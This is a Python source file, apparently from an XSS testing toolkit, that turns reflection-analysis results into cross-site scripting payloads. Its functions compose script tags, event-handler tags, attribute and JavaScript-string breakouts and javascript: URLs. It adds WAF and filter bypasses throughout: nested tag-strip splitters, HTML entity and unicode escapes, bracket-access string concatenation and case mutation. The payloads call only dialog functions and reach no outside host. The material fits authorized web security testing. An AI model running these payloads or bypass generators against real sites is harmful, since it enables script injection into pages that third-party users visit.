#!/usr/bin/env python3
"""
recommend_payload.py — deterministic payload recommendation.

Reads the latest *-xss_reflection_analysis.json produced by check_reflection.py
and turns it into concrete XSS payload candidates using:

  1. BREAKER computation (XSStrike htmlParser model): for each reflection
     context, derive the minimal string needed to break out of it
     (e.g. attribute -> quote + ">", JS string -> "</script>").
  2. Character efficiency gating (XSStrike checker model): every candidate
     payload is only emitted if all special characters it requires survived
     the filter (score 100 = unchanged, 50 = present but transformed, 0 = gone).
  3. Composition grammar (XSStrike genGen model): payloads are assembled from
     tag x event-handler x function x terminator primitives instead of a
     static list, so filter combinations outside the case library are covered.
  4. Marker-based DOM verification (DalFox R/V model): with --verify, the top
     payloads are actually injected with a unique marker attribute and the
     response is parsed as HTML. The payload is graded V (marker lands in an
     executable position) or R (reflected but not executable).

The curated case/ library remains the reference: each generated payload is
annotated with the case file it corresponds to (confidence 10 knowledge).
"""
import argparse
import json
import os
import re
import secrets
import string
import subprocess
import sys
from datetime import datetime
from html.parser import HTMLParser
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from log_utils import latest_log_path, new_log_path

PLACEHOLDER = "{xss_testing}"

# --- grammar primitives (XSStrike genGen model) ------------------------------

TAG_HANDLERS = [
    ("img", "onerror", "src=x", ("img_tag", "onerror", "pair_img_onerror")),
    ("svg", "onload", "", ("svg_tag", "onload", "pair_svg_onload")),
    ("details", "ontoggle", "open", ("details_tag", "ontoggle", "pair_details_ontoggle")),
    ("body", "onload", "", ("body_tag", "onload", "pair_body_onload")),
    ("iframe", "onload", "", ("iframe_tag", "onload", "pair_iframe_onload")),
]

# Nested tag-strip bypass (case "xss tag removed.md") is handled by the
# generic `splitters` machinery inside compose() below: every keyword
# item that came back deleted becomes a splitter, and any blocked
# tag/handler/function atom is rebuilt by wrapping the splitter inside it
# (<im<img>g>, on<scr>error, ...). rand_tag (<kmi> junk tag) is tried
# first -- a generic tag-stripper can split ANYTHING.

CONSUMING_TAGS = ["noscript", "style", "title", "textarea", "iframe", "script"]

# '>'-terminated handler composites: a WAF may pass the bare 'svg onload'
# pair yet sign 'onload=<call>()' — the random-identifier probes give
# per-event composite evidence. Handlers not listed have no matching
# probe and keep their pair_* gates only.
GEN_EV = {"onload": "gen_handler", "onerror": "gen_h_error"}

# map context string fragments -> internal context key
CONTEXT_MAP = [
    ("attribute event-handler value", "attr_handler"),
    ("attribute srcdoc value", "attr_srcdoc"),
    ("attribute url value", "attr_url"),
    ("attribute value", "attr"),
    ("javascript line comment", "js_lcomment"),
    ("javascript block comment", "js_bcomment"),
    ("javascript template literal", "js_template"),
    ("javascript raw", "js_raw"),
    ("javascript string", "js_string"),
    ("inside noscript", "consuming:noscript"),
    ("inside style", "consuming:style"),
    ("inside title", "consuming:title"),
    ("inside textarea", "consuming:textarea"),
    ("inside iframe", "consuming:iframe"),
    ("inside script", "consuming:script"),
    ("html comment", "comment"),
    ("html body", "html"),
]

# curated case-library references (kept as confidence-10 knowledge source)
CASE_REF = {
    "breakout_tag": "xss inside an attribute value inside a tag without angle brackets encoded.md",
    "attr_inject": "xss inside an attribute value inside a tag.md",
    "js_breakout": "xss into javascript string without angle brackets encoded.md",
    "js_string_exec": "xss into javascript string with angle brackets encoded.md",
    "tag_breakout": "xss inside a tag.md",
    "body_direct": "xss without encoding and filtering.md",
    "gt_missing": "xss without greater than.md",
    "comment_break": "xss with consuming tags.md",
    "protocol": "xss with javascript protocol.md",
}


# --- helpers -----------------------------------------------------------------

def char_scores(results, refl_idx):
    """Per-character efficiency: 100 unchanged, 50 transformed-but-present,
    0 removed/encoded away."""
    scores = {}
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"] or ""
        if r["passed"]:
            scores[exp] = 100
        elif exp in got:
            scores[exp] = 50
        else:
            scores[exp] = 0
    return scores


def usable(ch, scores):
    return scores.get(ch, 0) >= 100


def min_eff(payload, scores):
    """Worst efficiency among the six probe chars the payload actually uses."""
    probe = set("'\"<>/\\")
    used = [c for c in payload if c in probe]
    if not used:
        return 100
    return min(scores[c] for c in used)


def required_ok(payload, scores):
    """Gate: only emit payload if every probe char it needs scored 100."""
    probe = set("'\"<>/\\")
    return all(scores[c] == 100 for c in payload if c in probe)


def normalize_contexts(contexts):
    keys = []
    for c in contexts:
        for frag, key in CONTEXT_MAP:
            if frag in c.lower():
                keys.append(key)
                break
    return keys or ["html"]


def detect_quote(source_html, marker_full):
    """Re-parse the saved response: find which quote wraps the reflection
    when it lands inside an attribute value or JS string."""
    if not source_html or not os.path.exists(source_html):
        return '"'
    body = open(source_html, encoding="utf-8", errors="replace").read()
    esc = re.escape(marker_full)
    for q in ('"', "'", "`"):
        if re.search(r'[=(\s]' + re.escape(q) + r'[^' + re.escape(q) + r']*' + esc,
                     body, re.DOTALL):
            return q
    # unquoted attribute: =MARKER or =...MARKER
    if re.search(r'=[^\s"\'>]*' + esc, body):
        return ""
    return '"'


def breakers(ctx, quote):
    """Minimal string needed to escape the context (XSStrike 'breaker')."""
    if ctx == "html":
        return [""]
    if ctx == "attr":
        if quote == "":
            return [">", " autofocus onfocus="]
        return [quote + ">", f"{quote} autofocus onfocus={quote}"]
    if ctx == "js_string":
        return ["</script>", quote + "-"]
    if ctx in ("attr_handler", "attr_url", "attr_srcdoc", "js_raw", "js_template"):
        return [""]
    if ctx == "js_lcomment":
        return ["\n"]
    if ctx == "js_bcomment":
        return ["*/"]
    if ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        return [f"</{tag}>"]
    if ctx == "comment":
        return ["-->"]
    return [""]


def split_str(target, s):
    """Insert a filter-removed string s inside a blocked target at the
    midpoint so the filter's removal merges the halves back into target
    (split_str('<script>', '<xDh>') -> '<scr<xDh>ipt>').
    Case: xss tag removed.md — any deleted string works as a splitter,
    not just the classic <scr<script>ipt> pattern."""
    k = max(1, len(target) // 2)
    return target[:k] + s + target[k:]


def entity_fname(name):
    """Encode ONE random letter of a JS fn name as a decimal char ref
    ('alert' -> 'al&#101;rt'). Valid only inside attribute values — the
    HTML parser decodes &#NNN; before the JS engine compiles the
    handler, so keyword filters never see the literal name."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"&#{ord(name[i])};" + name[i + 1:]


def entity_variants(name, kw):
    """Alternative char-ref spellings for ONE letter: hex, padded
    decimal, capital-X, and no-semicolon forms ('alert' -> 'al&#x65;rt',
    'al&#0000101;rt', 'al&#X65;rt', 'al&#x65rt'). Same decode layer as
    &#NNN; (the HTML parser — attribute values only) but different byte
    patterns, so a filter that signs the canonical spelling misses them.
    hex_ref gates the &#x/padded/X family; nosemi_ref gates the ';'-less
    forms, which are emitted only when the next letter cannot extend
    the reference ('&#x6c'+'e' would merge into one wrong char)."""
    if not (kw.get("hex_ref", True) or kw.get("nosemi_ref", True)):
        return None
    i = secrets.randbelow(len(name))
    cp = ord(name[i])
    nxt = name[i + 1] if i + 1 < len(name) else ""
    forms = []
    if kw.get("hex_ref", True):
        forms += [f"&#x{cp:x};", f"&#{cp:07d};", f"&#X{cp:X};"]
    if kw.get("nosemi_ref", True):
        if not nxt or not nxt.isdigit():
            forms.append(f"&#{cp}")
        if not nxt or not re.match(r"[0-9a-fA-F]", nxt):
            forms.append(f"&#x{cp:x}")
    if not forms:
        return None
    return name[:i] + secrets.choice(forms) + name[i + 1:]


def encoded_funcs(kw):
    """Dialog-fn call strings with one letter entity-encoded, emitted
    ONLY for call forms whose plain version is blocked by the keyword
    mask (the name itself, or its call_*/tick_* junction signature).
    char_ref ('&#101;') gates '&...;' survival — if it came back as
    '&amp;#101;' or stripped, char refs never decode and the technique
    is dead on arrival; entity_lt ('&lt;') is the legacy fallback.
    gen_call/gen_tick must pass too — an encoded name cannot rescue a
    dead ()-call or `1`-call shape (filter blocks 'abc()' wholesale)."""
    if not kw.get("char_ref", kw.get("entity_lt", True)):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out = []
    for name in ("alert", "confirm", "prompt"):
        enc = entity_fname(name)
        var = entity_variants(name, kw)
        if parens and (not kw.get(name, True)
                       or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}(1)")
            if var:
                out.append(f"{var}(1)")
        if btick and (not kw.get(name, True)
                      or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
            if var:
                out.append(f"{var}`1`")
    if parens and (not kw.get("print", True)
                   or not kw.get("call_print", True)):
        out.append(entity_fname("print") + "()")
        pv = entity_variants("print", kw)
        if pv:
            out.append(pv + "()")
    if not parens and not btick and not kw.get("alert", True):
        out.append(f"onerror={entity_fname('alert')};throw 1")
        av = entity_variants("alert", kw)
        if av:
            out.append(f"onerror={av};throw 1")
    return out


def u_fname(name):
    """Encode ONE random letter of a JS fn name as a unicode escape
    ('alert' -> 'al\\u0065rt'). Decoded by the JS engine, not the HTML
    parser — valid wherever the payload lands as JS source: <script>
    bodies, on*="..." values, javascript: URIs, js_* contexts."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{ord(name[i]):04x}" + name[i + 1:]


def u_funcs(kw):
    """Unicode-escaped call strings for dialog-fns whose plain form is
    blocked (name or its call_*/tick_* junction). Backslash survival is
    enforced by required_ok — '\\' is a char-probe item, so filtered or
    transformed backslashes auto-reject these payloads at the char
    gate; no keyword proxy needed. gen_call/gen_tick apply the control
    layer: a dead generic call shape kills the (1)/`1` forms outright."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out = []
    for name in ("alert", "confirm", "prompt"):
        enc = u_fname(name)
        if parens and (not kw.get(name, True)
                       or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}(1)")
        if btick and (not kw.get(name, True)
                      or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
    if parens and (not kw.get("print", True)
                   or not kw.get("call_print", True)):
        out.append(u_fname("print") + "()")
    if not parens and not btick and not kw.get("alert", True):
        out.append(f"onerror={u_fname('alert')};throw 1")
    return out


def u6_fname(name):
    """Encode ONE random letter of a JS fn name as an ES6 brace-form
    unicode escape ('alert' -> 'al\\u{65}rt'). Same decode layer as
    \\u0065 (the JS engine — valid in identifiers AND string literals)
    but the \\u{XX} shape is not matched by filters written for the
    fixed 4-digit form, and the digit count inside the braces is
    arbitrary ('\\u{0000000065}' is still 'a')."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{{{ord(name[i]):x}}}" + name[i + 1:]


def u6_funcs(kw):
    """ES6 \\u{XX} call strings for dialog-fns whose plain form is
    blocked (name or call_*/tick_* junction) — the brace-form sibling
    of u_funcs. gen_u6brace probes whether the '{...}' escape shape
    reaches the page at all: a filter can strip '{' while leaving a
    bare \\u untouched."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    brace = kw.get("gen_u6brace", True)
    out = []
    for name in ("alert", "confirm", "prompt"):
        enc = u6_fname(name)
        if parens and brace and (not kw.get(name, True)
                                 or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}(1)")
        if btick and brace and (not kw.get(name, True)
                                or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
    if parens and brace and (not kw.get("print", True)
                             or not kw.get("call_print", True)):
        out.append(u6_fname("print") + "()")
    if not parens and not btick and not kw.get("alert", True):
        out.append(f"onerror={u6_fname('alert')};throw 1")
    return out


def bracket_funcs(kw, forbid_q=None):
    """Global-object string-concat calls: self['a'+'lert'](1) et al.

    Two roles: (a) the vehicle for string-only escapes ('\\x61',
    '\\141', '\\u{61}') which can never appear in an identifier;
    (b) the only name-bypass surviving when BOTH '\\' and '&' are
    filtered — a pure 'a'+'lert' concat needs neither. Emitted ONLY
    for names whose plain call form is blocked (the name itself or its
    call_* junction): when alert(1) works there is nothing to bypass,
    so no candidate is generated (saves verify steps). gen_bracket
    controls the composite self['x'+'y']() shape; gen_call/gen_tick
    still gate the call shapes. forbid_q drops the inner-quote variant
    that would collide with the surrounding context (js_string
    '-...-', attr_handler/url/srcdoc "...\"...")."""
    if not kw.get("gen_bracket", True):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    quotes = [q for q in ("'", '"') if q != forbid_q] or ["'"]
    objs = ("self", "window", "globalThis", "top", "frames")
    per_name = []
    for oi, name in enumerate(("alert", "confirm", "prompt", "print")):
        if kw.get(name, True) and \
                kw.get(f"call_{name}", kw.get("gen_call", True)):
            continue
        arg = "()" if name == "print" else "(1)"
        obj = objs[oi % len(objs)]  # rotated alt-object for diversity
        # unsplit/noop-escape/embed-literal forms carry the name verbatim:
        # provably dead when the name atom itself is stripped (kw[name]=F),
        # so they are pruned instead of wasting verify steps on corpses.
        name_ok = kw.get(name, True)
        # every split position: 'a'+'lert' .. 'aler'+'t' — deterministic
        # coverage of anything a random splitter could emit
        splits = [(name[:k], name[k:]) for k in range(1, len(name))]
        cp = ord(name[0])
        v = []
        if parens:
            for q in quotes:
                if name_ok:
                    v.append(f"self[{q}{name}{q}]{arg}")
                    # single-string escapes: the JS engine decodes these
                    # INSIDE the string literal — the request carries
                    # neither the fn name nor a concat shape. '\a' is a
                    # noop-escape: backslash before a non-escape letter
                    # is ignored -> 'a' (NZT-48 invalid-escape vector).
                    v.append(f"self[{q}\\{name[0]}{name[1:]}{q}]{arg}")
                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
                v.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]{arg}")
                v.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]{arg}")
                for fst, rst in splits:
                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]{arg}")
            if obj != "self":
                q = quotes[0]
                if name_ok:
                    v.append(f"{obj}[{q}{name}{q}]{arg}")
                v.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
                for fst, rst in splits[:2]:
                    v.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]{arg}")
            q, (fst, rst) = quotes[0], splits[0]
            v.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]{arg}")
            v.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]{arg}")
            v.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]{arg}")
        elif btick:
            for q in quotes:
                if name_ok:
                    v.append(f"self[{q}{name}{q}]`1`")
                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]`1`")
                for fst, rst in splits:
                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]`1`")
        else:
            q, (fst, rst) = quotes[0], splits[0]
            if name_ok:
                v.append(f"onerror=self[{q}{name}{q}];throw 1")
            v.append(f"onerror=self[{q}\\x{cp:02x}{name[1:]}{q}]"
                     f";throw 1")
            v.append(f"onerror={obj}[{q}{fst}{q}+{q}{rst}{q}]"
                     f";throw 1")
        per_name.append(v)
    # Round-robin across fn names: a growing fn_cap samples every family
    # evenly (each name's simplest forms first) instead of exhausting one
    # family's variants before the next name is ever reached.
    out = []
    for i in range(max((len(v) for v in per_name), default=0)):
        for v in per_name:
            if i < len(v):
                out.append(v[i])
    return out


def junction_ok(item, kw, kwv):
    """Refined junction-probe verdict. The js_break_* probes embed a
    literal fn name ('-alert(1)-): a FAIL can mean the filter stripped
    ONLY the name while the breakout syntax survived. Proof: expected
    minus every blocked fn-name equals got_back — then encoded fn
    names still flow through the junction."""
    if kw.get(item, True):
        return True
    e, g = kwv.get(item, ("", ""))
    if not e:
        return False
    stripped = e
    for n in ("alert", "confirm", "prompt", "print"):
        if not kw.get(n, True):
            stripped = stripped.replace(n, "")
    return stripped == g


def avail_funcs(kw):
    """JS call primitives allowed by the keyword mask (Layer B/C gate).
    Missing keyword analysis -> everything assumed allowed (backward compat).
    gen_call/gen_tick (random-identifier probes) are the control layer:
    when a call_*/tick_* junction probe is absent they decide whether the
    bare call shape itself is viable. A passing call_* probe is direct
    evidence and always wins over the generic control."""
    parens = kw.get("parentheses", True)
    btick = kw.get("backtick", True)
    call_shape = parens and kw.get("gen_call", True)
    tick_shape = btick and kw.get("gen_tick", True)
    funcs = []
    for name in ("alert", "confirm", "prompt"):
        if not kw.get(name, True):
            continue
        if parens and kw.get(f"call_{name}", kw.get("gen_call", True)):
            funcs.append(f"{name}(1)")
        if btick and kw.get(f"tick_{name}", kw.get("gen_tick", True)):
            funcs.append(f"{name}`1`")
    if parens and kw.get("print", True) and \
            kw.get("call_print", kw.get("gen_call", True)):
        funcs.append("print()")
    if not call_shape and not tick_shape and kw.get("alert", True):
        funcs.append("onerror=alert;throw 1")
    return funcs


# DOM sinks that insert markup via innerHTML-style APIs: a <script> element
# created this way is inert per the HTML spec — it never executes, so script
# payloads must not be emitted for these sinks (event-handler tags do fire).
INERT_SCRIPT_SINKS = ("innerhtml", "outerhtml", "insertadjacenthtml",
                      "createcontextualfragment")


def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
    """Assemble candidate payloads from grammar primitives.
    kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
    kwv: {name: (expected, got_back)} — the actual probed strings, needed to
    build nested splitters from whatever string the filter deleted.
    inert: sink inserts markup without running scripts (innerHTML-family).
    Returns list of dicts: {payload, technique, case_ref, efficiency}."""
    kw = kw or {}
    kwv = kwv or {}
    funcs = avail_funcs(kw)
    # Contexts where a fn lands INSIDE a live quote — a bracket-concat
    # using the same quote char would terminate it early ('-...-' in a
    # '...' JS string, on*="..." handler/url/srcdoc values). Bracket
    # fns there must build their strings with the OTHER quote.
    INNER_Q_CTXS = ("attr_handler", "attr_url", "attr_srcdoc",
                    "js_string")
    forbid_q = quote if (ctx in INNER_Q_CTXS
                         and quote in ("'", '"')) else None
    # hfuncs — event-handler attribute values (on*="..."): both HTML
    # char refs (&#NNN;) and JS unicode escapes (NNNN) decode there.
    # jfuncs — JS-source positions (<script> bodies, js_* contexts,
    # javascript: URIs): only \u escapes decode; &#NNN; stays literal.
    # Both lists are pre-filtered through required_ok: an fn needing a
    # probe char that scored <100 can never survive add()'s gate anyway,
    # and leaving it in place would waste hfuncs[:fn_cap]/[0] slots on dead
    # variants (e.g. aler\u0074(1) when '\' is escaped -> '\\').
    hfuncs = [f for f in (funcs + encoded_funcs(kw) + u_funcs(kw)
                          + u6_funcs(kw) + bracket_funcs(kw, forbid_q))
              if required_ok(f, scores)]
    jfuncs = [f for f in (funcs + u_funcs(kw) + u6_funcs(kw)
                          + bracket_funcs(kw, forbid_q))
              if required_ok(f, scores)]
    out = []
    marker = "vvm{id}"

    def add(payload, technique, case_ref):
        if required_ok(payload, scores):
            if "&#" in payload:
                technique += " (entity-encoded fn)"
            if "\\u" in payload:
                technique += " (unicode-escaped fn)"
            if "['" in payload or '["' in payload:
                technique += " (bracket-access fn)"
            out.append({
                "payload": payload,
                "technique": technique,
                "case_ref": case_ref,
                "efficiency": min_eff(payload, scores),
            })

    def shape_ok(gen_key, fn):
        """Composite-probe gate: applies only when fn uses the ()-call
        shape the probe carries ('abc()'). Backtick/throw forms have a
        different signature — their gate already ran in the fn builders."""
        return "(" not in fn or gen_key is None or kw.get(gen_key, True)

    tags_ok = usable("<", scores) and usable(">", scores)
    slash_ok = usable("/", scores)
    q_ok = quote == "" or usable(quote, scores)
    script_ok = kw.get("script_tag", True)

    def handler_variants():
        """(tag, ev, extra) entries allowed by the keyword mask."""
        return [(t, e, x) for t, e, x, deps in TAG_HANDLERS
                if all(kw.get(d, True) for d in deps)]

    if ctx == "html":
        if tags_ok:
            # Strings the filter deleted outright (item FAILed AND its
            # reflection came back empty). Any one of them can be nested
            # inside a blocked tag/keyword: the filter deletes the splitter
            # and the fragments merge back (case: xss tag removed.md).
            # rand_tag first — when even the random junk tag was stripped the
            # filter is a generic tag-stripper that can split ANYTHING.
            splitters = sorted(
                ((n, e) for n, (e, g) in kwv.items()
                 if not kw.get(n, True) and e and g == ""),
                key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
            rsplit = [s for _, s in splitters]

            def fix(key, word, s):
                """Split word with removed string s when its kw key was
                blocked; leave it unchanged when it passed."""
                return word if kw.get(key, True) else split_str(word, s)

            def rebuild_fn(s):
                """funcs is empty -> every call primitive is blocked.
                Rebuild 'alert' via splitter s + the call syntax that
                survived; the mid-name split also breaks call_*/tick_*
                junction signatures (request never contains 'alert(1)')."""
                if kw.get("parentheses", True) and kw.get("gen_call", True):
                    return [split_str("alert", s) + "(1)"]
                if kw.get("backtick", True) and kw.get("gen_tick", True):
                    return [split_str("alert", s) + "`1`"]
                return []

            if not inert:
                if script_ok:
                    for fn in jfuncs or (rebuild_fn(rsplit[0]) if rsplit else []):
                        if shape_ok("gen_script", fn):
                            add(f"<script {marker}>{fn}</script>",
                                "script injection", "body_direct")
                else:
                    if kw.get("case_script", True):
                        for fn in jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else []):
                            add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                                "case-mutated script tag", "tag_removed")
                    for s in rsplit[:3]:
                        for fn in jfuncs[:fn_cap] or rebuild_fn(s):
                            # marker must sit inside a /* */ comment here:
                            # the split tag already closed, so a bare
                            # marker>fn becomes `ident > fn` -> dead code.
                            add(f"{split_str('<script>', s)}{fn}/*{marker}*/"
                                f"{split_str('</script>', s)}",
                                f"nested tag-strip bypass ({s} splitter)", "tag_removed")
            for tag, ev, extra, deps in TAG_HANDLERS:
                if all(kw.get(d, True) for d in deps):
                    for fn in hfuncs[:fn_cap]:
                        if shape_ok(GEN_EV.get(ev), fn):
                            add(f"<{tag} {extra} {marker} {ev}={fn}>"
                                .replace("  ", " "),
                                f"{tag} {ev} handler", "body_direct")
                else:
                    # Rebuild blocked atoms by nesting a removed string.
                    # When ONLY the pair_* junction failed (e.g. the WAF
                    # signs 'img onerror' while every atom passes), the tag
                    # atom is split unconditionally — otherwise the emitted
                    # payload still carries the contiguous signature and is
                    # dead on arrival. Atom-blocked cases split only the
                    # blocked atoms, keeping splitter occurrences minimal.
                    for s in rsplit[:2]:
                        atom_blocked = any(
                            not kw.get(d, True)
                            for d in deps if not d.startswith("pair_"))
                        tag_atom = fix(tag + "_tag", "<" + tag, s) \
                            if atom_blocked else split_str("<" + tag, s)
                        for fn0 in hfuncs[:fn_cap] or rebuild_fn(s):
                            if "=" in fn0:
                                # in-attribute fallback already carries
                                # 'onerror=' — emit it bare, tag split only
                                add(f"{tag_atom} {extra} {marker} {fn0}>"
                                    .replace("  ", " "),
                                    f"removed-string splitter ({s})", "tag_removed")
                                continue
                            fname = re.split(r"[(`]", fn0)[0]
                            add(f"{tag_atom} {extra} {marker} "
                                f"{fix(ev, ev, s)}="
                                f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
                                .replace("  ", " "),
                                f"removed-string splitter ({s})", "tag_removed")
            if kw.get("javascript_proto", True) and \
                    kw.get("proto_href", True):
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_jsurl", fn):
                        add(f'<a {marker} href="javascript:{fn}">XSS</a>',
                            "javascript: protocol href", "protocol")
            if not kw.get("javascript_proto", True) and kw.get("case_proto", True):
                for fn in jfuncs[:fn_cap]:
                    add(f'<a {marker} href="JaVaScRiPt:{fn}">XSS</a>',
                        "case-mutated javascript: href", "protocol")
            jfns = jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else [])
            if not kw.get("javascript_proto", True) and rsplit and jfns:
                for jfn in jfns:
                    add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
                        f'{jfn}">XSS</a>',
                        f"removed-string splitter ({rsplit[0]})", "tag_removed")
            if kw.get("svg_tag", True) and not kw.get("onload", True) \
                    and kw.get("case_onload", True):
                for fn in hfuncs[:fn_cap]:
                    add(f"<svg {marker} OnLoAd={fn}>",
                        "case-mutated onload handler", "body_direct")
            # last-resort: entity-encoded inner HTML inside iframe srcdoc.
            # Reaches the case "keywords/()/script blocked but entities pass".
            # The inner fn name also gets \u-escaped when 'alert' itself is
            # blocked — after the entity decode the JS engine resolves it.
            if kw.get("entity_lt", True) and kw.get("srcdoc", True) and \
                    kw.get("iframe_tag", True) and \
                    (not kw.get("parentheses", True) or not script_ok
                     or not kw.get("alert", True)):
                src_fn = "alert" if kw.get("alert", True) else u_fname("alert")
                add(f'<iframe {marker} srcdoc=&lt;script&gt;{src_fn}&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                    "iframe srcdoc entity-encoded", "special_attrs")
        elif usable("<", scores) and not usable(">", scores) and hfuncs:
            # "no greater-than" (case: xss without greater than.md): the
            # tag stays unterminated and the page's OWN next '>' closes
            # it. A '<tag>' keyword can only fail HERE because its '>'
            # vanished -- gating on it makes this branch unreachable, so
            # instead check the bare NAME survived via kwv got_back:
            # '<svg>' -> '<svg' means only the '>' was stripped.
            def name_ok(key):
                if kw.get(key, True):
                    return True
                e, g = kwv.get(key, ("", ""))
                return bool(e) and g == e.replace(">", "")
            for tag, ev, extra, deps in TAG_HANDLERS:
                others = [d for d in deps if d != deps[0]]
                if name_ok(deps[0]) and \
                        all(kw.get(d, True) for d in others):
                    for fn in hfuncs[:fn_cap]:
                        add(f"<{tag} {extra} {marker} {ev}={fn}//"
                            .replace("  ", " "),
                            f"no greater-than ({tag} {ev})", "gt_missing")

    elif ctx == "attr":
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in hfuncs[:fn_cap]:
                    if shape_ok(GEN_EV.get(ev), fn):
                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
                            .replace("  ", " "),
                            "attribute breakout -> tag", "breakout_tag")
            if script_ok and jfuncs:
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_script", fn):
                        add(f'{quote}><script {marker}>{fn}</script>',
                            "attribute breakout -> script", "breakout_tag")
        elif q_ok:
            sep = quote if quote else " "
            if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
                for fn in hfuncs[:fn_cap]:
                    add(f'{sep} autofocus onfocus={sep}{fn}' if quote else
                        f' autofocus onfocus={fn} accesskey=x',
                        "in-context attribute injection", "attr_inject")

    elif ctx == "attr_handler":
        # input already inside an existing on*="" handler — zero-breaker JS
        for fn in hfuncs:
            add(f'{fn}/*{marker}*/', "in-handler direct call", "attr_inject")
        if quote and q_ok:
            for fn in hfuncs[:fn_cap]:
                add(f'{quote});{fn}/*{marker}*/;//',
                    "handler close-call breakout", "breakout_tag")

    elif ctx == "attr_url":
        # breakout first: a quote+tag escape works in ANY url attribute
        # (src=, href= alike) and fires without user interaction, whereas
        # javascript: needs href= + a click and is dead in src=/data=.
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in hfuncs[:fn_cap]:
                    if shape_ok(GEN_EV.get(ev), fn):
                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
                            .replace("  ", " "),
                            "url-attr breakout -> tag", "breakout_tag")
        if kw.get("javascript_proto", True):
            for fn in jfuncs:
                if shape_ok("gen_jsurl", fn):
                    add(f'javascript:{fn}/*{marker}*/',
                        "javascript: URL direct", "protocol")

    elif ctx == "attr_srcdoc":
        if kw.get("entity_lt", True):
            for fn in jfuncs:
                add(f'&lt;script&gt;{marker}{fn}&lt;/script&gt;',
                    "srcdoc entity HTML", "special_attrs")

    elif ctx == "js_raw":
        for fn in jfuncs:
            add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
        for fn in jfuncs[:fn_cap]:
            add(f');{fn}/*{marker}*/;//', "raw JS close-call", "js_string_exec")

    elif ctx == "js_template":
        if kw.get("interp", True):
            for fn in jfuncs:
                add(f'${{{fn}}}/*{marker}*/', "template-literal interpolation",
                    "js_string_exec")
        if quote == "`" and q_ok:
            for fn in jfuncs[:fn_cap]:
                add(f'`+{fn}+`/*{marker}*/', "literal concat breakout", "js_string_exec")

    elif ctx == "js_lcomment":
        if kw.get("newline", True):
            for fn in jfuncs:
                add(f'\n{fn}/*{marker}*/;//', "line-comment close + exec", "js_breakout")

    elif ctx == "js_bcomment":
        if kw.get("comment_close", True):
            for fn in jfuncs:
                add(f'*/{fn}/*{marker}*/;//', "block-comment close + exec", "js_breakout")

    elif ctx == "js_string":
        if tags_ok and slash_ok and script_ok and kw.get("close_script", True):
            for fn in jfuncs[:fn_cap]:
                if shape_ok("gen_script", fn):
                    add(f"</script><script {marker}>{fn}</script>//",
                        "script tag breakout", "js_breakout")
        elif q_ok and quote:
            brk = "js_break_squote" if quote == "'" else \
                  "js_break_dquote" if quote == '"' else None
            genbrk = "gen_break_squote" if quote == "'" else \
                     "gen_break_dquote" if quote == '"' else None
            # '"-abc()-"' is direct composite evidence and outranks the
            # junction_ok inference. If it fails but junction_ok still
            # proves the '"-x-' wrapper (only the ()-call inside was
            # signatured), non-parens fns can still ride the breakout.
            if genbrk in kw:
                if kw[genbrk]:
                    fns = jfuncs
                elif brk and junction_ok(brk, kw, kwv):
                    fns = [f for f in jfuncs if "(" not in f]
                else:
                    fns = []
            elif not brk or junction_ok(brk, kw, kwv):
                fns = jfuncs
            else:
                fns = []
            for fn in fns:
                add(f"{quote}-{fn}-{quote}", "in-string JS execution",
                    "js_string_exec")

    elif ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
            if script_ok and jfuncs:
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_script", fn):
                        add(f"</{tag}><script {marker}>{fn}</script>",
                            f"{tag} close + script", "tag_breakout")
